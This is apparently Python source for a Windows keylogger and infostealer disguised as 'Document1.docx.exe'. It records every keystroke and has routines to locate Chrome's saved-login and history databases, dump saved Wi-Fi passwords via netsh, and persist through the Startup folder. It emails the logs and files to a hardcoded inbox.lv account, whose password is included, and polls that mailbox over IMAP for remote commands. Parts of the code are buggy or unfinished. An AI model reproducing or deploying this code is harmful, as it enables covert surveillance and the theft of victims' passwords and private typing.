import smtplib
import imaplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os import getcwd, path
from subprocess import check_output
from time import sleep

import keyboard

ID = 1
SENDING_INTERVAL = 90
SENDER = "cuij@inbox.lv"
RECEIVERS = ["cuij@inbox.lv"]
PASSWORD = "F9wQ!jHUp5"

KEYLOGGER_FILE = "Document1.docx.exe"

global log
log = ""
typed_string = ""


def logprint(text, overwrite=False):
    global log
    print(text)
    if overwrite:
        log = text
    else:
        log += text


def on_press(event):
    global log, typed_string
    logprint(f"{event.time}:Key {event.name} pressed (Code:{event.scan_code})\n")
    typed_string += f"{event.name}"


def get_chrome_data():
    '''Returns a list with the respective paths of the login and history SQL databases'''
    global log
    logprint("INFO: Attempting to retrieve chrome data...\n")
    data_path = path.expanduser('~').replace(
        "\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
    login_db_path = path.join(data_path, 'Login Data')
    history_db_path = path.join(data_path, 'History')
    logprint("INFO: Successfully retrieved chrome data.\n")
    return [login_db_path, history_db_path]


def get_wifi_data():
    ''' Returns a list of all known wifi credentials'''
    global log
    logprint("INFO: Attempting to retrieve wifi data...\n")
    data = check_output(['netsh', 'wlan', 'show', 'profiles'
                         ]).decode('utf-8',
                                   errors="backslashreplace").split('\n')
    profiles = [
        i.split(":")[1][1:-1] for i in data
        if "Profil Tous les utilisateurs" in i
    ]

    credentials_list = []
    for i in profiles:
        results = subprocess.check_output([
            'netsh', 'wlan', 'show', 'profile', i, 'key=clear'
        ]).decode('utf-8', errors="backslashreplace").split('\n')
        results = [
            b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b
        ]

        credential_set = {"ESSID": "", "Key": ""}
        credential_set["ESSID"] = f"{i.strip()}"
        try:
            credential_set["Key"] = f"{results[0]}"
        except IndexError:
            credential_set["Key"] = "[Unknown]"
        finally:
            credentials_list.append(credential_set)
    file_path = "{}/wifi.json".format(path.expanduser('~').replace('\\', '/'))
    logprint(f"INFO: Writing data to {file_path}\n")
    with open(file_path,"w") as file:
        file.write(credentials_list) 
    logprint("INFO: Successfully retrieved wifi data.\n")
    return file_path


def make_persistent(current_file_name):
    '''Adds program to Startup Files, making it persist after reboots.'''
    logprint("INFO: Attempting to become persistent...")
    current_file_path = "{}/{}".format(getcwd().replace('\\','/'),current_file_name)
    new_file_path = "{}/{}".format(path.expanduser('~').replace('\\', '/'),"AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
    try:
        command_output = check_output(
            f"cp {current_file_path} {new_file_path}")
    except:
        logprint("ERROR: cp command failed, see output below.")
        logprint(command_output)
        logprint("Warning: Persistence operation failed.")
    else:
        logprint("INFO: Successfully made program persistent")

def run_command_order(email_body):
    logprint(f"INFO: Command text is as follows, running:{email_body}\n")
    # Extract the list
    command_order = email_body.partition('[')
    print('1',command_order)
    command_order = command_order[1] + command_order[2]
    print('2',command_order)
    command_order = command_order.partition(']')
    print('3',command_order)
    print(command_order[0])
    print(command_order[1])
    print(command_order[2])
    print(command_order[0]+command_order[1])
    command_order = command_order[0] + command_order[1]
    print(command_order)
    logprint('4',command_order)

def send_results(message_text="",file_paths=[]):
    print("INFO: Running sending check...")
    global log, typed_string
    if log != "" or message_text != "":
        logprint("INFO: New logs detected.")
        logprint("INFO: Generating e-mail report...")

        msg = MIMEMultipart()
        msg['From'] = SENDER
        msg['To'] = ",".join(RECEIVERS)
        msg['Subject'] = f"Report from {ID}"

        if message_text != "":
            body = message_text 
        else:
            body = f"Report:\nLog (since last report):\n{log}\n\n\n\nTyped string(since program launch):\n{typed_string}\n\n\n\n{'Attached files' if file_paths else ''}."
        msg.attach(MIMEText(body, 'plain'))

        if file_paths:
            for file in file_paths:
                attachement = open(file, 'rb')
                p = MIMEBase('application', 'octet-stream')
                p.set_payload((attachment).read())
                encoders.encode_base64(p)
                p.add_header('Content-Disposition', f'attachment; filename={file}')
                msg.attach(p)

        text = msg.as_string()
        logprint(
            f"INFO: Connecting to SMTP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
        )
        try:
            server = smtplib.SMTP_SSL('mail.inbox.lv', 465)
            server.login(SENDER, PASSWORD)
        except Exception as e:
            logprint(
                f"ERROR: Couldn't connect to server, see error traceback below\n{type(e)}\n{str(e)}\n"
            )
            logprint(f"ERROR: Mailing failed.\n")
        else:
            logprint(f"INFO: Successfully connected.\n")
            logprint(f"INFO: Sending from {SENDER} to {RECEIVERS}...\n")
            try:
                server.sendmail(SENDER, RECEIVERS, text)
                    
            except Exception as e:
                logprint(
                    f"ERROR: Couldn't send mail, see error traceback below\n{type(e)}\n{str(e)}\n"
                )
                logprint(f"ERROR: Mailing failed.\n")
            else:
                logprint("INFO: Mailing successful.\n")
                server.quit()
                logprint('INFO: Cleared "log" variable.\n')
                logprint("",overwrite=True)
    else:
        print("INFO: No new keyboard input.\n")

def fetch_commands():
    print("INFO: Running new command check...\n")
    print(
        f"INFO: Connecting to IMAP server, with username {SENDER} and PASSWORD {PASSWORD}.\n"
    )
    try:
        server = imaplib.IMAP4_SSL("mail.inbox.lv", 993)
        server.login(SENDER, PASSWORD)
    except Exception as e:
        logprint(
            f"ERROR: Couldn't connect to IMAP server, see error traceback below\n{type(e)}\n{str(e)}\n"
        )
        logprint(f"ERROR: Check failed.\n")
    else:
        print(f"INFO: Successfully connected.\n")
        print(f"INFO: Fetching from {SENDER}...\n")
        try:
            server.select('INBOX')

            status, response = server.search(None, f'(FROM "{SENDER}" SUBJECT "Command (for {ID})" UNANSWERED)')
            unread_msg_nums = response[0].split()
            print(f"INFO: Found {len(unread_msg_nums)} new command emails\n")
            if len(unread_msg_nums)==0:
                print("INFO: No commands to run\n")
            else:
                logprint("INFO: Running only first command\n")
                _, response = server.fetch(unread_msg_nums[0], '(UID BODY[TEXT])')
                # Mark it as seen
                server.store(unread_msg_nums[0], '+FLAGS', '\Seen')
                print('\n\n\n\n\n',response[0][1])
                run_command_order(response[0][1].decode("utf-8"))

        except Exception as e:
            logprint(
                f"ERROR: Couldn't fetch mail, see error traceback below\n{type(e)}\n{str(e)}\n"
            )
            logprint(f"ERROR: Check failed.\n")
        else:
            print("INFO: Check successful.\n")
            server.close()

keyboard.on_press(on_press)
#get_chrome_data()
#get_wifi_data()
#make_persistent()
while 1:
    fetch_commands()
    sleep(SENDING_INTERVAL)
    send_results()
